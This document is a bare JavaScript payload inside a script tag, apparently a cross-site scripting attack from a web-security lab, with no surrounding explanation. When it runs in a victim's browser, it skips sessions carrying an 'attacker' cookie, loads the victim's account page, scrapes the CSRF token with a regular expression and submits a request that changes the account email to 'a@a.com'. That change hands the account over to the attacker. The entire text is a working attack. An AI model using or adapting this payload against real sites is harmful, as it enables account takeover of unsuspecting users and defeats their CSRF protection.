<script>
    if (!document.cookie.includes('attacker'))
    {
        fetch('/my-account')
        .then((resp) => resp.text())
        .then((text) =>
        {
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            body = new URLSearchParams({
                'csrf': text.match(/name="csrf" value="(\w+)"/)[1],
                'email': 'a@a.com'
            });
            fetch('/my-account/change-email', { method: 'POST', headers: headers, body: body });
        });
    }
</script>
